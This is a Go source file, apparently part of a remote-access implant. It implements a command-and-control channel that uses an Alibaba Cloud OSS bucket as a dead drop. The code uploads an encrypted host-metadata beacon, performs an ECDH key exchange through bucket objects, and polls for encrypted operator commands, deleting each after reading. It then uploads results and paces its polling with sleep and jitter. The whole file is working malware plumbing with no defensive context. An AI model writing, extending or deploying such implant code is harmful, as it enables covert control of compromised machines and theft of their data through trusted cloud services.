//go:build transport_oss || transport_multi

package main

import (
	"fmt"
	"implant/core/app"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/debuglog"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"io"
	"sort"
	"strings"
	"time"

	"github.com/aliyun/aliyun-oss-go-sdk/oss"
)

// OSSClient 实现 communication.Transport（OSS 轮询模型）。
type OSSClient struct {
	bucket       *oss.Bucket
	Uid          string
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	pendingKeys  []string // 一次 List 缓存的待处理对象 key，避免每条命令都 List
}

// NewTransport 构造 OSS 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("oss", newOSSTransport)
	listenerType = "oss"
}

func newOSSTransport() transportClient {
	return &OSSClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// IsConnected 当前是否已连接
func (s *OSSClient) IsConnected() bool { return s.connected }

// ReconnectMgr 返回重连管理器
func (s *OSSClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }

// PollInterval 轮询型：空闲间隔 = sleep 基准（SLEEP 命令动态生效），
// jitter 由 runLoop 空闲分支统一施加
func (s *OSSClient) PollInterval() time.Duration { return config.WaitTime }

func (s *OSSClient) fail() {
	s.connected = false
	s.pendingKeys = nil
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectFailed()
	}
}

func (s *OSSClient) Connect(host string) error {
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectAttempt()
	}
	parts := strings.Split(host, ":")
	if len(parts) < 4 {
		s.fail()
		return fmt.Errorf("oss 配置格式错误: %q", host)
	}
	ossClient, err := oss.New(parts[0], parts[1], parts[2])
	if err != nil {
		s.fail()
		return err
	}
	bucket, err := ossClient.Bucket(parts[3])
	if err != nil {
		s.fail()
		return err
	}
	s.bucket = bucket

	// 会话前 ECDH 交换（必须在生成 MetaInfo 之前：MetaInfo 是首帧，
	// 先加密再交换的话那份对象仍会被静态密钥解开）。
	s.kxHandshake()

	// MetaInfo + Uid（与原 oss 客户端一致的派生方式）
	if len(utils.MetaInfo) == 0 {
		metaRaw, metaErr := utils.EncryptedMetaInfo()
		if metaErr != nil {
			s.fail()
			return fmt.Errorf("生成 MetaInfo 失败: %v", metaErr)
		}
		metaB64, metaErr2 := encrypt.EncodeBase64(metaRaw)
		if metaErr2 != nil {
			s.fail()
			return fmt.Errorf("编码 MetaInfo 失败: %v", metaErr2)
		}
		utils.MetaInfo = metaB64
		tmp, _ := encrypt.DecodeBase64(utils.MetaInfo)
		tmp, _ = encrypt.DecryptWithMasterKey(tmp)
		s.Uid = encrypt.BytesToMD5(tmp)
	}

	// FirstBlood
	if err := s.send(s.Uid+fmt.Sprintf("/client_%020d", time.Now().UnixNano()),
		utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
		s.fail()
		return err
	}

	// 会话密钥
	salt, masterKey := app.GetListenerKeyConfig("oss")
	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
		s.fail()
		return err
	}
	s.connected = true
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectSuccess()
	}
	return nil
}

// list 列举桶对象 key（排序），ListObjects 失败时返回错误以触发重连。
func (s *OSSClient) list() ([]string, error) { return s.listMax(3) }

// kxHandshake 会话前密钥交换。
//
// OSS 没有请求/响应语义，只有"上传对象 + 列表轮询"，所以交换要多一个来回：
//  1. 上传 <uid>/client_kx_* （载荷 = WriteInt(kxMsgType) + 32 字节公钥）
//  2. 服务端处理后在桶里写 <uid>/kxresp_* （载荷 = 32 字节服务端公钥）
//  3. 客户端轮询取回、派生、替换静态主密钥
//
// uid 用 GetMetaInfoClientID()：它算的是 MD5(MetaInfo 明文)，不依赖任何密钥，
// 所以可以在 MetaInfo 生成之前拿到 —— 否则这里的鸡生蛋问题无解。
//
// 失败一律静默回落静态密钥（与"服务端不支持 ECDH"同表现）。
func (s *OSSClient) kxHandshake() {
	kx, err := encrypt.NewKeyExchange()
	if err != nil {
		return
	}
	uid, err := utils.GetMetaInfoClientID()
	if err != nil || uid == "" {
		return
	}
	name := uid + fmt.Sprintf("/client_kx_%020d", time.Now().UnixNano())
	if err := s.send(name, utils.BytesCombine(utils.WriteInt(kxMsgType), kx.PublicKey())); err != nil {
		return
	}
	// 服务端轮询桶有 1~5s 退避，客户端再留余量；超时即放弃，不阻塞上线
	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		time.Sleep(500 * time.Millisecond)
		keys, err := s.listMax(64)
		if err != nil {
			return
		}
		for _, k := range keys {
			if !strings.Contains(k, "/kxresp_") {
				continue
			}
			data := s.get(k)
			s.del(k)
			if len(data) != encrypt.ECDHPublicKeySize {
				continue
			}
			salt, _ := app.GetListenerKeyConfig("oss")
			masterKey, derr := kx.DeriveMasterKey(data, salt[:16])
			if derr != nil {
				return
			}
			if rerr := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); rerr != nil {
				return
			}
			utils.MetaInfo = nil // 旧 MetaInfo 由静态密钥生成，必须重建
			debuglog.Printf("🔑 [OSS-KX] 会话前密钥交换完成，已替换静态主密钥\n")
			return
		}
	}
	debuglog.Printf("⚠️ [OSS-KX] 等待服务端公钥超时，回落静态密钥\n")
}

// listMax 指定返回键数量上限。
// Recv 只要 3 个（逐条消费）；KX 握手要更多，否则响应对象可能不在这几个键里。
func (s *OSSClient) listMax(maxKeys int) ([]string, error) {
	if s.bucket == nil {
		return nil, fmt.Errorf("未初始化")
	}
	lsRes, err := s.bucket.ListObjects(oss.MaxKeys(maxKeys), oss.Prefix(""))
	if err != nil {
		return nil, err
	}
	var keys []string
	for _, o := range lsRes.Objects {
		keys = append(keys, o.Key)
	}
	sort.Strings(keys)
	return keys, nil
}

// get 取对象内容并 base64 解码（与原 oss.Get 一致）。
func (s *OSSClient) get(name string) []byte {
	body, err := s.bucket.GetObject(name)
	if err != nil {
		return nil
	}
	defer body.Close()
	data, err := io.ReadAll(body)
	if err != nil {
		return nil
	}
	dec, _ := encrypt.DecodeBase64(data)
	return dec
}

func (s *OSSClient) del(name string) {
	if s.bucket != nil {
		s.bucket.DeleteObject(name)
	}
}

// send base64 编码后 PutObject（与原 oss.Send 一致）。
func (s *OSSClient) send(name string, content []byte) error {
	if s.bucket == nil {
		return fmt.Errorf("未初始化")
	}
	encoded, _ := encrypt.EncodeBase64(content)
	return s.bucket.PutObject(name, strings.NewReader(string(encoded)))
}

// Recv 取一条命令：缓存 key 用尽则重新 List；逐个 Get+Del+双 base64 解码+解密。无命令返回 nil。
func (s *OSSClient) Recv() ([]byte, error) {
	if len(s.pendingKeys) == 0 {
		keys, err := s.list()
		if err != nil {
			s.fail()
			return nil, err
		}
		s.pendingKeys = keys
	}
	if len(s.pendingKeys) == 0 {
		return nil, nil
	}
	name := s.pendingKeys[0]
	s.pendingKeys = s.pendingKeys[1:]
	data := s.get(name)
	s.del(name)
	if data == nil {
		return nil, nil
	}
	rawData, err := encrypt.DecodeBase64(data)
	if err != nil {
		return nil, nil
	}
	decrypted, err := communication.DecryptCommand(rawData)
	if err != nil {
		return nil, err
	}
	// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4）
	return communication.ConsumeSessionNonce(decrypted)
}

// SendResult 按 oss 分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet，再 base64 + PutObject 到 Uid/client_TS。
func (s *OSSClient) SendResult(b64Packet []byte) error {
	msg := utils.BytesCombine(utils.WriteInt(len(utils.MetaInfo)), utils.MetaInfo, b64Packet)
	msgToSend := utils.BytesCombine(utils.WriteInt(2), msg)
	name := s.Uid + fmt.Sprintf("/client_%020d", time.Now().UnixNano())
	return s.send(name, msgToSend)
}

func (s *OSSClient) Close() error { return nil }
